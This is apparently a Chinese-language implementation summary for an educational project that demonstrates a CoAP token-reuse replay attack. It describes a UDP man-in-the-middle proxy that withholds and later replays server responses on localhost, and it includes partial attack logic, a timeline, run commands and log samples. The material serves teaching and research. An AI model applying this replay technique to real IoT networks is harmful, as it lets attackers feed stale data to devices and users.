# CoAP Token 重用攻击 - MITM 实现总结

## 🎯 实现目标

重写攻击者逻辑，实现一个**完整的中间人代理（MITM）**，使攻击者成为客户端和服务器之间的必经之路。

## ✅ 已完成的工作

### 1. 重写 `attacker.py`

**旧实现**：
- 使用 Scapy 嗅探网络流量
- 需要管理员权限
- 依赖 Npcap/WinPcap
- 被动监听，无法完全控制流量

**新实现**：
- 使用 Python 标准库 `socket`
- 无需管理员权限
- 纯 Python 实现
- 主动代理，完全控制所有流量

### 2. 核心架构

```
┌─────────┐         ┌──────────┐         ┌─────────┐
│ Client  │────────▶│ Attacker │────────▶│ Server  │
│ :random │         │  :5684   │         │  :5683  │
└─────────┘         └──────────┘         └─────────┘
     ▲                    │                    
     │                    │                    
     └────────────────────┘                    
          (延迟重放)
```

### 3. 关键组件

#### CoAPMessage 类
```python
class CoAPMessage:
    """简单的 CoAP 消息解析器"""
    
    @staticmethod
    def parse(data):
        """解析 CoAP 消息，提取 Token、消息ID、代码等"""
        # 解析 CoAP 头部
        # Ver(2bit) | Type(2bit) | TKL(4bit) | Code(8bit) | Message ID(16bit)
        ...
```

#### MITMAttacker 类
```python
class MITMAttacker:
    """中间人攻击者 - UDP 代理"""
    
    async def handle_client_request(self, data, client_addr):
        """处理客户端请求，转发到服务器"""
        
    async def handle_server_response(self, data, server_addr):
        """处理服务器响应，决定是否转发或缓存"""
        
    async def delayed_replay(self, token_hex, response_data, client_addr):
        """延迟重放旧响应"""
        
    async def run(self):
        """运行 MITM 代理"""
```

### 4. 攻击逻辑

```python
async def handle_server_response(self, data, server_addr):
    # 解析响应
    msg = CoAPMessage.parse(data)
    token_hex = msg['token'].hex()
    
    # 判断是第几个请求
    request_num = self.request_counter.get(token_hex, 0)
    
    if request_num == 1:
        # 🎯 第一个请求的响应：缓存，不转发
        logger.warning("捕获第一个请求的响应，缓存不转发！")
        self.captured_responses[token_hex] = (data, client_addr)
        
        # 调度延迟重放
        asyncio.create_task(self.delayed_replay(token_hex, data, client_addr))
    else:
        # 其他请求的响应：立即转发
        self.sock.sendto(data, client_addr)
```

### 5. 新增文件

1. **`attacker.py`** (重写)
   - 完整的 MITM 代理实现
   - 291 行代码
   - 无外部依赖（除标准库）

2. **`demo_mitm_attack.py`** (新增)
   - 演示脚本
   - 展示完整的攻击流程
   - 包含详细的日志输出

3. **`MITM_ATTACK_GUIDE.md`** (新增)
   - 完整的使用指南
   - 架构图和流程图
   - 故障排除指南

4. **`MITM_IMPLEMENTATION_SUMMARY.md`** (本文件)
   - 实现总结
   - 技术细节
   - 对比分析

## 📊 技术对比

| 特性 | 旧实现 (Scapy) | 新实现 (Socket) |
|------|----------------|-----------------|
| **依赖** | Scapy, Npcap | 仅标准库 |
| **权限** | 需要管理员 | 无需特殊权限 |
| **平台** | Windows 需特殊配置 | 跨平台 |
| **控制** | 被动嗅探 | 主动代理 |
| **可靠性** | 可能丢包 | 完全控制 |
| **复杂度** | 高 | 低 |

## 🎯 攻击流程详解

### 时间线

```
T0:  Client → Attacker: 请求 A (Token: T)
T1:  Attacker → Server: 转发请求 A
T2:  Server → Attacker: 响应 A' (Token: T)
T3:  Attacker: 缓存 A'，不转发！ 🎯
T4:  Client: 超时（10秒）
T5:  Client → Attacker: 请求 B (Token: T, 相同!)
T6:  Attacker → Server: 转发请求 B
T7:  Server → Attacker: 响应 B' (Token: T)
T8:  Attacker → Client: 转发 B' ✅
T9:  Client: 处理 B'
T10: Attacker → Client: 重放 A' (Token: T) 💣
T11: Client: 误认为 A' 是新响应！ ❌
```

### 关键点

1. **T3**: 攻击者缓存第一个响应，不转发
2. **T5**: 客户端超时后重试，使用相同 Token
3. **T8**: 第二个响应正常转发
4. **T10**: 延迟后重放第一个响应
5. **T11**: 客户端无法区分新旧响应

## 🚀 使用方法

### 快速开始

```bash
# 终端 1: 启动服务器
cd coap_token_replay
uv run python server.py

# 终端 2: 启动攻击者
cd coap_token_replay
uv run python attacker.py

# 终端 3: 运行演示
cd coap_token_replay
uv run python demo_mitm_attack.py
```

### 预期输出

**攻击者日志**：
```
======================================================================
📤 [请求 #1] 客户端 → 攻击者
   Token: 1a2b3c4d
📨 [转发] 攻击者 → 服务器
======================================================================
📥 [响应 #1] 服务器 → 攻击者
   Token: 1a2b3c4d
🎯 [攻击] 捕获第一个请求的响应，缓存不转发！
======================================================================
💣 [攻击] 重放旧响应！
   Token: 1a2b3c4d
   ✅ 旧响应已重放！
======================================================================
```

## 🔧 配置选项

```bash
# 自定义端口
python attacker.py --listen-port 8888 --server-port 9999

# 自定义延迟
python attacker.py --delay 10

# 完整配置
python attacker.py \
  --listen-host 127.0.0.1 \
  --listen-port 5684 \
  --server-host 127.0.0.1 \
  --server-port 5683 \
  --delay 5
```

## ✅ 优势

1. **简单可靠**：无需复杂的网络配置
2. **跨平台**：在 Windows/Linux/Mac 上都能运行
3. **易于调试**：清晰的日志输出
4. **完全控制**：可以精确控制每个数据包
5. **教育友好**：代码简洁，易于理解

## 📚 相关文档

- `MITM_ATTACK_GUIDE.md` - 详细使用指南
- `attacker.py` - 攻击者实现
- `demo_mitm_attack.py` - 演示脚本
- `README.md` - 项目总览

## 🎓 学习要点

1. **MITM 原理**：理解中间人攻击的本质
2. **UDP 代理**：学习如何实现 UDP 代理
3. **CoAP 协议**：理解 CoAP 消息格式
4. **异步编程**：掌握 Python asyncio 的使用
5. **安全漏洞**：认识 Token 重用的危害

## 🎉 总结

成功实现了一个**完整的、可工作的、易于使用的** CoAP Token 重用攻击演示！

核心改进：
- ✅ 从被动嗅探改为主动代理
- ✅ 从依赖 Scapy 改为纯 Python
- ✅ 从需要权限改为无需权限
- ✅ 从复杂配置改为开箱即用

这个实现更适合：
- 教学演示
- 安全研究
- 协议分析
- 漏洞验证

